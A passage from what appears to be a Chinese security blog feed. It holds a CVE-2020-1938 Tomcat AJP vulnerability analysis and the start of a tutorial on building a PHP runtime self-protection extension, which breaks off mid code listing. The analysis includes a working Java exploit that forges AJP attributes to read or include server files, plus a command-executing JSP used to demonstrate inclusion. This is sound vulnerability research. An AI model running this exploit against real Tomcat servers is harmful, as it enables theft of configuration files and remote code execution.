alt="-w805"></p><p>Tomcat服务器通过Connector连接器组件与客户程序建立连接，connector组件负责接收客户的请求，以及把Tomcat服务器的响应结果发送给客户。</p><p>在上图的配置中有两个connect，即8080端口对应着Http Connector，使用http（HTTP/1.1）协议；8009使用的AJP Connector，使用的是 AJP 协议（Apache Jserv Protocol）是定向包协议。因为性能原因，使用二进制格式来传输可读性文本，它能降低 HTTP 请求的处理成本，因此主要在需要集群、反向代理的场景被使用。更详细的介绍可以参考一下AJP协议的官方文档:<a href="http://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html" target="_blank" rel="noopener">The Apache Tomcat Connectors - AJP Protocol Reference</a></p><p>Web客户访问的两种方式：<br><img src="https://i.loli.net/2020/03/02/whOKXL8gN4GRjbp.jpg" alt=""></p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>配置idea的时候先下个源码：<a href="https://repo1.maven.org/maven2/org/apache/tomcat/tomcat-coyote/8.5.16/tomcat-coyote-8.5.16-sources.jar" target="_blank" rel="noopener">https://repo1.maven.org/maven2/org/apache/tomcat/tomcat-coyote/8.5.16/tomcat-coyote-8.5.16-sources.jar</a></p><p>tomcat-coyote.jar!/org/apache/coyote/ajp/AjpProcessor.class#prepareRequest<br><img src="https://i.loli.net/2020/03/02/Q6Beip7bf9v5ngC.jpg" alt="-w1008"><br>在AJP协议的请求结构中有这样一个字段<em>属性</em><code>attributes</code>：<br><img src="https://i.loli.net/2020/03/02/GgFneVsmU8XJAHO.jpg" alt="-w1014"><br>对应上文代码中<code>switch case</code>中的匹配项，跟进<code>Constants.SC_A_REQ_ATTRIBUTE</code>：/org/apache/coyote/ajp/Constants.java<br><img src="https://i.loli.net/2020/03/02/SiXz1xOd68EsNfD.jpg" alt="-w1020"><br>这里定义了所有属性，<code>Constants.SC_A_REQ_ATTRIBUTE</code>这个case在文档中对应<code>req_attribute</code>属性，意思是说，如果要发超出上述基础属性以外的值，都可以通过<code>req_attribute(0X0A)</code>来设置其属性名和值来发送。<br><img src="https://i.loli.net/2020/03/02/avTn3W8NroS56Id.jpg" alt="-w1490"><br>不难理解，也就对应着这里的处理逻辑，如果是在上述之外属性，则允许我们自定义：<br><img src="https://i.loli.net/2020/03/02/RIOvT3hPSF2V4cD.jpg" alt="-w977"></p><p>这里其实就是允许我们设置Request对象的attribute属性。在下文中会提到的几个属性可以被设置：</p><ul><li>javax.servlet.include.request_uri</li><li>javax.servlet.include.path_info</li><li>javax.servlet.include.servlet_path</li></ul><p>封装完request对象后，继续处理Servlet的映射流程<br><img src="https://i.loli.net/2020/03/02/GhHuvb47dz9fcCq.jpg" alt="-w1431"></p><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>当url请求未在映射的url列表里面则会通过tomcat默认的DefaultServlet会根据上面的三个属性来读取文件，<code>/org/apache/catalina/servlets/DefaultServlet.class</code>：<br><img src="https://i.loli.net/2020/03/02/JxKwrQa6Wp743qy.jpg" alt="-w1459"><br>跟进<code>getRelativePath</code>函数，当<code>request</code>属性中<code>javax.servlet.include.request_uri</code>不为空，则取出另外两个<code>javax.servlet.include.path_info</code>和<code>javax.servlet.include.servlet_path</code>属性，最后加到<code>result</code>里返回：<br><img src="https://i.loli.net/2020/03/02/hRp45k2VFQAunPD.jpg" alt="-w1133"></p><p>然后将结果带入<code>this.resources.getResource</code>函数：<br><img src="https://i.loli.net/2020/03/02/sRJ6VLzEIe5w1bh.jpg" alt="-w1584"><br>然后一直跟进，直到调用<code>this.cache.getResource</code>函数读取资源：<br><img src="https://i.loli.net/2020/03/02/HjaxYmqBo3iRhUZ.jpg" alt="-w1651"></p><p>读取到<code>/WEB-INF/web.xml</code>文件：<br><img src="https://i.loli.net/2020/03/02/biZMujmY3yNX4kL.jpg" alt="-w1139"></p><h3 id="任意文件包含"><a href="#任意文件包含" class="headerlink" title="任意文件包含"></a>任意文件包含</h3><p>当url请求映射在<code>org.apache.jasper.servlet.JspServlet</code>这个servlet的时候也可通过上述三个属性来控制访问的jsp文件。<br><img src="https://i.loli.net/2020/03/02/zDC8YK3Qb6ZqrEP.jpg" alt="-w1253"></p><p>随便包含一个上传的文件:<br>upload<br><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> <span class="keyword">import</span>=<span class="string">"java.lang.*"</span> contentType=<span class="string">"text/html; charset=ISO-8859-1"</span></span><br><span class="line">    pageEncoding=<span class="string">"ISO-8859-1"</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">Runtime.getRuntime().exec(<span class="string">"open -a Calculator"</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/03/02/nXhI6vVD3oZqO5k.jpg" alt="-w1377"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>ajp协议的通信客户端demo: <a href="https://github.com/kohsuke/ajp-client" target="_blank" rel="noopener">https://github.com/kohsuke/ajp-client</a></p><p>这里贴一个threedr3am师傅的EXP: <a href="https://github.com/threedr3am/learnjavabug" target="_blank" rel="noopener">https://github.com/threedr3am/learnjavabug</a><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileRead</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    SimpleAjpClient ac = <span class="keyword">new</span> SimpleAjpClient();</span><br><span class="line">    String host = <span class="string">"localhost"</span>;</span><br><span class="line">    <span class="keyword">int</span> port = <span class="number">8009</span>;</span><br><span class="line">    String uri = <span class="string">"/xxxxxxxxxxxxxxxest.xxx"</span>;</span><br><span class="line">    String file = <span class="string">"/index.jsp"</span>;</span><br><span class="line">    <span class="keyword">if</span> (args.length == <span class="number">4</span>) &#123;</span><br><span class="line">      host = args[<span class="number">0</span>];</span><br><span class="line">      port = Integer.parseInt(args[<span class="number">1</span>]);</span><br><span class="line">      uri = args[<span class="number">2</span>].equalsIgnoreCase(<span class="string">"file"</span>) ? uri : <span class="string">"/xxxxxxxxxxxxxxxest.jsp"</span>;</span><br><span class="line">      file = args[<span class="number">3</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    ac.connect(host, port);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create a message that indicates the beginning of the request</span></span><br><span class="line">    TesterAjpMessage forwardMessage = ac.createForwardMessage(uri);</span><br><span class="line">    forwardMessage.addAttribute(<span class="string">"javax.servlet.include.request_uri"</span>, <span class="string">"1"</span>);</span><br><span class="line">    forwardMessage.addAttribute(<span class="string">"javax.servlet.include.path_info"</span>, file);</span><br><span class="line">    forwardMessage.addAttribute(<span class="string">"javax.servlet.include.servlet_path"</span>, <span class="string">""</span>);</span><br><span class="line">    forwardMessage.end();</span><br><span class="line">    ac.sendMessage(forwardMessage);</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">      <span class="keyword">byte</span>[] responseBody = ac.readMessage();</span><br><span class="line">      <span class="keyword">if</span> (responseBody == <span class="keyword">null</span> || responseBody.length == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      System.out.print(<span class="keyword">new</span> String(responseBody));</span><br><span class="line">    &#125;</span><br><span class="line">    ac.disconnect();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>比较简单，没啥好说的，指定路由为jsp的时候走<code>org.apache.jasper.servlet.JspServlet</code>处理，其他则走<code>/org/apache/catalina/servlets/DefaultServlet</code>默认处理。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>洞挺牛逼的，虽然不能直接命令执行，本地的mxsrvs启动tomcat的时候默认启动8009，但是实测了一些真实环境的，独立部署的时候大都没有ajp这个端口，或许在负载均衡反代的场景比较多？</p><p> 参考文章</p><ul><li><a href="https://www.anquanke.com/post/id/199448" target="_blank" rel="noopener">CVE-2020-1938 : Tomcat-Ajp 协议漏洞分析</a></li><li><a href="http://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html" target="_blank" rel="noopener">The Apache Tomcat Connectors - AJP Protocol Reference</a></li><li><a href="https://juejin.im/post/5cf6366ce51d45105e021275" target="_blank" rel="noopener">如何断点调试Tomcat源码</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Web" scheme="http://0day.design/categories/Web/"/>
    
    
      <category term="Java" scheme="http://0day.design/tags/Java/"/>
    
      <category term="漏洞分析" scheme="http://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>从0开始的PHP RASP的学习</title>
    <link href="http://0day.design/2020/03/01/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84PHP%20RASP%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
    <id>http://0day.design/2020/03/01/从0开始的PHP RASP的学习/</id>
    <published>2020-03-01T10:29:00.000Z</published>
    <updated>2020-03-02T07:12:05.024Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="RASP-设计思路"><a href="#RASP-设计思路" class="headerlink" title="RASP 设计思路"></a>RASP 设计思路</h3><p>RASP（Runtime Application self-protection）是一种在运行时检测攻击并且进行自我保护的一种技术。PHP RASP的设计思路很直接，安全圈有一句名言叫一切输入都是有害的，我们就跟踪这些有害变量，看它们是否对系统造成了危害。我们跟踪了HTTP请求中的所有参数、HTTP Header等一切client端可控的变量，随着这些变量被使用、被复制，信息随之流动，我们也跟踪了这些信息的流动。我们还选取了一些敏感函数，这些函数都是引发漏洞的函数，例如require函数能引发文件包含漏洞，mysqli-&gt;query方法能引发SQL注入漏洞。简单来说，这些函数都是大家在代码审计时关注的函数。我们利用某些方法为这些函数添加安全检查代码。当跟踪的信息流流入敏感函数时，触发安全检查代码，如果通过安全检查，开始执行敏感函数，如果没通过安全检查，阻断执行，通过SAPI向HTTP Server发送403 Forbidden信息。当然，这一切都在PHP代码运行过程中完成。</p><p>这里主要有两个技术问题，一个是如何跟踪信息流，另一个是如何安全检查到底是怎样实现的。<br>有两个技术思路来解决两个问题，第一个是动态污点跟踪，另一个是基于词法分析的漏洞检测。本文用主要分析的是污点标记的方法。</p><h3 id="技术栈"><a href="#技术栈" class="headerlink" title="技术栈"></a>技术栈</h3><ul><li>taint污点分析模式<ul><li>命令执行</li><li>XSS</li><li>SQL</li></ul></li><li>payload模式：重命名+phpwaf<ul><li>特征捕获检测</li></ul></li></ul><p>简而言之taint检测未知，payload上线前Fuzz检测<br>taint：污点标记，对参数传递过程进行判断清除或保留标记<br>payload模式：忽略参数传递过程，只分析最后作用于敏感函数的参数是否恶意</p><h3 id="PHP生命周期"><a href="#PHP生命周期" class="headerlink" title="PHP生命周期"></a>PHP生命周期</h3><p>简而言之，无论以哪种方式启动php程序，经过下边四个步骤：模块初始化（MINIT）、请求初始化(RINIT)、请求处理、请求结束(RSHUTDOWN)、模块结束(MSHUTDOWN)<br><img src="https://i.loli.net/2020/03/01/ozHCscaQTyjXBgO.jpg" alt="-w117"><br>这四个阶段对应扩展开发中<code>PHP_MINIT_FUNCTION</code>、<code>PHP_MSHUTDOWN_FUNCTION</code>、<code>PHP_RINIT_FUNCTION</code>、<code>PHP_RSHUTDOWN_FUNCTION</code>四个函数来处理对应的功能。</p><h3 id="php-opcode"><a href="#php-opcode" class="headerlink" title="php opcode"></a>php opcode</h3><p>opcode是计算机指令中的一部分，用于指定要执行的操作，指令的格式和规范由处理器的指令规范指定。</p><p>记录一下php解析的过程：</p><ul><li>旧版本：php代码—&gt;词法、语法分析-&gt;直接生成opcode指令</li><li>php7：php代码—&gt;词法、语法分析生成抽象语法树AST-&gt;opcode指令</li></ul><p>简单概括一下，所有php代码最终以opcode指令的形式在zend虚拟机中执行。</p><h3 id="函数实现"><a href="#函数实现" class="headerlink" title="函数实现"></a>函数实现</h3><p>PHP中函数的存储结构：/Zend/zend_compile.h#404<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> _zend_function &#123;</span><br><span class="line">zend_uchar type;<span class="comment">/* MUST be the first element of this struct! */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">zend_uchar type;  <span class="comment">/* never used */</span></span><br><span class="line">zend_uchar arg_flags[<span class="number">3</span>]; <span class="comment">/* bitset of arg_info.pass_by_reference */</span></span><br><span class="line"><span class="keyword">uint32_t</span> fn_flags;</span><br><span class="line">zend_string *function_name;</span><br><span class="line">zend_class_entry *scope;</span><br><span class="line"><span class="keyword">union</span> _zend_function *prototype;</span><br><span class="line"><span class="keyword">uint32_t</span> num_args;</span><br><span class="line"><span class="keyword">uint32_t</span> required_num_args;</span><br><span class="line">zend_arg_info *arg_info;</span><br><span class="line">&#125; common;</span><br><span class="line"></span><br><span class="line">zend_op_array op_array;</span><br><span class="line">zend_internal_function internal_function;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>这个联合体里边定义了四个结构体，内部函数通过扩展或者内核提供的C函数，比如time、array等，编译后用的<code>internal_function</code>结构；用户自定函数编译后为普通的opcode数组，用的<code>op_array</code>结构。剩下的<code>common</code>和<code>type</code>可以看做是<code>internal_function</code>和<code>op_array</code>的header。</p><p>实际上还有其他几类函数，暂时还没太明白：<br><img src="https://i.loli.net/2020/03/01/RyXcnNqhFalDG7H.jpg" alt="-w634"></p><h4 id="内部函数"><a href="#内部函数" class="headerlink" title="内部函数"></a>内部函数</h4><p>内部函数是指由内核、扩展提供的C语言编写的function，这类函数不用经过opcode的编译过程，效率高于php用户自定义函数，调用时与普通的C程序没有差异。</p><p>Zend引擎中定义了很多内部函数供用户在PHP中使用，比如：<code>define、defined、strlen、method_exists、class_exists、function_exist</code>等等，除了Zend引擎中定义的内部函数，PHP扩展中也提供了大量内部函数，我们也可以灵活的通过扩展自行定制。</p><p>前文介绍<code>zend_function</code>为<code>union</code>，其中<code>internal_function</code>就是内部函数用到的具体结构：/Zend/zend_compile.h#384<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zend_internal_function</span> &#123;</span></span><br><span class="line"><span class="comment">/* Common elements */</span></span><br><span class="line">zend_uchar type;</span><br><span class="line">zend_uchar arg_flags[<span class="number">3</span>]; <span class="comment">/* bitset of arg_info.pass_by_reference */</span></span><br><span class="line"><span class="keyword">uint32_t</span> fn_flags;</span><br><span class="line">zend_string* function_name;</span><br><span class="line">zend_class_entry *scope;</span><br><span class="line">zend_function *prototype;</span><br><span class="line"><span class="keyword">uint32_t</span> num_args;</span><br><span class="line"><span class="keyword">uint32_t</span> required_num_args;</span><br><span class="line">zend_internal_arg_info *arg_info;</span><br><span class="line"><span class="comment">/* END of common elements */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> (*handler)(INTERNAL_FUNCTION_PARAMETERS);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_module_entry</span> *<span class="title">module</span>;</span></span><br><span class="line"><span class="keyword">void</span> *reserved[ZEND_MAX_RESERVED_RESOURCES];</span><br><span class="line">&#125; zend_internal_function;</span><br></pre></td></tr></table></figure></p><p><code>zend_internal_function</code>头部是一个与<code>zend_op_array</code>完全相同的common结构。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="开发流程"><a href="#开发流程" class="headerlink" title="开发流程"></a>开发流程</h3><p>php版本7.0.33，为了方便开发扩展，先下载源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/php/php-src/archive/php-7.0.33.zip</span><br></pre></td></tr></table></figure></p><p>解压后，在php源码里有一个代码生成器<code>ext_skel</code>，位于<code>php-src-php-7.0.33/ext</code>，先构建扩展基本文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ext_skel --extname=passer6y</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/03/01/Fg64xzsUZe3LBNG.jpg" alt="-w697"></p><p>将<code>config.m4</code>文件中这几行前的dnl去掉：<br><img src="https://i.loli.net/2020/03/01/kTgiD1CHsNhbQqS.jpg" alt="-w558"></p><p>在头文件<code>php_passer6y.h</code>文件中声明扩展函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP_FUNCTION(passer6y_helloworld);</span><br></pre></td></tr></table></figure></p><p>接着编辑<code>passer6y.c</code>，添加一行：<code>PHP_FE(passer6y_helloworld, NULL)</code><br><img src="https://i.loli.net/2020/03/01/jKIZVrlipdTC3Gc.jpg" alt="-w726"></p><p>最后在文件末尾加入<code>passer6y_helloworld</code>函数代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PHP_FUNCTION(passer6y_helloworld)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> *arg = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">int</span> arg_len, len;</span><br><span class="line">  <span class="keyword">char</span> *strg;</span><br><span class="line">  <span class="keyword">if</span> (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, <span class="string">"s"</span>, &amp;arg, &amp;arg_len) == FAILURE) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  php_printf(<span class="string">"my first ext,Hello World!\n"</span>);</span><br><span class="line">  RETRUN_TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>编译扩展：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get install php7.0-dev</span><br><span class="line">phpize</span><br><span class="line">./configure --with-php-config=/usr/bin/php-config7.0</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/03/01/KGIgAsUjamLuBZT.jpg" alt="-w823"></p><p>测试插件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -d &quot;extension=passer6y.so&quot; -r &quot;passer6y_helloworld(&apos;123&apos;);&quot;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/03/01/Dh97aWoNxKQvyel.jpg" alt="-w889"></p><h3 id="GDB调试"><a href="#GDB调试" class="headerlink" title="GDB调试"></a>GDB调试</h3><p>参考文章：<a href="https://www.cnblogs.com/iamstudy/articles/php_code_rasp_1.html" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/articles/php_code_rasp_1.html</a><br>下载php7.0.23：<a href="http://mirrors.sohu.com/php/php-7.0.23.tar.gz" target="_blank" rel="noopener">http://mirrors.sohu.com/php/php-7.0.23.tar.gz</a><br>重新编译php，开启<code>--enable-debug</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">./configure \</span><br><span class="line">--prefix=/opt/php_debug/ \</span><br><span class="line">--enable-debug \</span><br><span class="line">--enable-cli \</span><br><span class="line">--without-pear \</span><br><span class="line">--enable-embed  \</span><br><span class="line">--enable-inline-optimization \</span><br><span class="line">--enable-shared \</span><br><span class="line">--enable-opcache \</span><br><span class="line">--enable-fpm \</span><br><span class="line">--with-gettext \</span><br><span class="line">--enable-mbstring \</span><br><span class="line">--with-iconv=/usr/local/libiconv \</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">mkdir /opt/php_debug/conf/  </span><br><span class="line">cp php.ini-development /opt/php_debug/conf/php.ini</span><br></pre></td></tr></table></figure></p><p>再加个软连接方便执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /opt/php_debug/bin/php /usr/bin/php_debug</span><br><span class="line">ln -s /opt/php_debug/bin/phpize /usr/bin/phpize_debug</span><br></pre></td></tr></table></figure></p><p>创建插件的步骤和之前一样，在config.m4最后加上：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if test -z "$PHP_DEBUG"; then</span><br><span class="line">        AC_ARG_ENABLE(debug,</span><br><span class="line">                [--enable-debug  compile with debugging system],</span><br><span class="line">                [PHP_DEBUG=$enableval], [PHP_DEBUG=no]</span><br><span class="line">        )</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></p><p>然后再编译即可用gdb调试了</p><blockquote><p>在make的时候可能会遇到libiconv的报错问题，参考这个文章安装一下就OK了，<a href="https://www.cnblogs.com/rwxwsblog/p/5451467.html" target="_blank" rel="noopener">https://www.cnblogs.com/rwxwsblog/p/5451467.html</a></p></blockquote><h3 id="vld查看代码opcode"><a href="#vld查看代码opcode" class="headerlink" title="vld查看代码opcode"></a>vld查看代码opcode</h3><p>参考文章：<a href="https://www.cnblogs.com/miao-zp/p/6374311.html" target="_blank" rel="noopener">https://www.cnblogs.com/miao-zp/p/6374311.html</a><br>安装vld：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://pecl.php.net/get/vld-0.14.0.tgz</span><br><span class="line">tar zxvf vld-0.14.0.tgz </span><br><span class="line">cd vld-0.14.0/</span><br></pre></td></tr></table></figure></p><p>找到php-config路径: <code>locate php-config</code><br>编译：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure --with-php-config=/usr/bin/php-config7.0 --enable-vld</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure></p><p>检查是否编译成功：<br><img src="https://i.loli.net/2020/03/01/7cp9niTNe6Kmthf.jpg" alt="-w703"><br>修改php.ini <code>/etc/php/7.0/cli/php.ini</code>，在最后加上：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extension=vld.so</span><br></pre></td></tr></table></figure></p><p>检测是否安装成功：<code>php -r &quot;phpinfo();&quot; | grep &quot;vld&quot;</code><br><img src="https://i.loli.net/2020/03/01/JTrw8SaIDAe26gX.jpg" alt="-w657"></p><p>功能测试：<br>写一个phpinfo，然后执行下边命令，<code>-dvld.active</code>参数为1时使用vld扩展，<code>-dvld.execute</code>为1时执行改文件，这里不需要执行文件，就看一下php代码转换对应的opcode指令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -dvld.active=1 -dvld.execute=0 1.php</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/03/01/oMys3ZfDadIxBUj.jpg" alt="-w638"></p><h3 id="apache配置"><a href="#apache配置" class="headerlink" title="apache配置"></a>apache配置</h3><p>还是之前的源码，重新编译php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./buildconf --force &amp;&amp; ./configure --disable-all --enable-debug --prefix=/opt/php --with-apxs2=/usr/bin/apxs &amp;&amp; make &amp;&amp; make install</span><br></pre></td></tr></table></figure></p><p>爆了一个线程安全的问题，执行下面两个命令凑合用着(每个子进程只有一个线程)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//  apache2 -t 查看错误日志</span><br><span class="line">a2dismod mpm_event</span><br><span class="line">a2enmod mpm_prefork</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/03/01/oyuf2v8NaTSO54U.jpg" alt="-w884"></p><p>也可以用康师傅写的dockerfile，一键拉取环境：<a href="media/15822119434822/Dockerfile.">Dockerfile</a></p><p>命令备忘：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php --ini        // 查看php.ini默认配置路径</span><br></pre></td></tr></table></figure></p><h2 id="函数Hook"><a href="#函数Hook" class="headerlink" title="函数Hook"></a>函数Hook</h2><p>两种方式：</p><ul><li>重命名函数，并在<code>function_table</code>删除原函数定义，接着在php中重新定义一个该函数(像waf一样在入口include)，并对参数进行威胁判断(prvd的payload模式)</li><li>直接在底层Hook opcode，并检测函数函数(taint模式)</li></ul><h3 id="重命名函数"><a href="#重命名函数" class="headerlink" title="重命名函数"></a>重命名函数</h3><p>这里的重命名内部函数是在<code>MINIT</code>阶段进行实现的，在<code>RINIT</code>阶段是无法对已有的内部函数进行修改名称，只能对用户函数修改(即php中自定义的函数)。</p><p>参考fate0师傅的<a href="https://github.com/fate0/xmark" target="_blank" rel="noopener">xmark</a>项目实现的<code>PHP_FUNCTION(xrename_function)</code>函数，核心在这段：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line">Bucket *p = rename_hash_key(EG(function_table), orig_fname, new_fname, XMARK_IS_FUNCTION);</span><br></pre></td></tr></table></figure></p><p>跟进<code>rename_hash_key</code>函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span 